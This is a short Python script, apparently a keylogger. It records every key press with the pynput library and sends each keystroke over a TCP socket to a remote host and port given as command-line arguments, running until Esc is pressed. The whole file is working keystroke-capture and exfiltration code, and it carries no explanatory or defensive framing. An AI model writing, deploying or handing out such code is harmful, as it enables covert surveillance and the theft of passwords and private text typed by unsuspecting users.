import socket
import sys

from pynput.keyboard import Key, Listener
HOST = sys.argv[1]
PORT = int(sys.argv[2])

def key_press(key):
    if key == Key.esc:
        s.close()
        global closed
        closed = True
    else:
        k = str(key)
        k = k.replace("'", "")
        s.sendall(bytes(k, "ascii"))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    closed = False
    listener = Listener(on_press=key_press)
    listener.start()
    while not closed:
        data = s.recv(1024)
        print(data.decode("ASCII"))
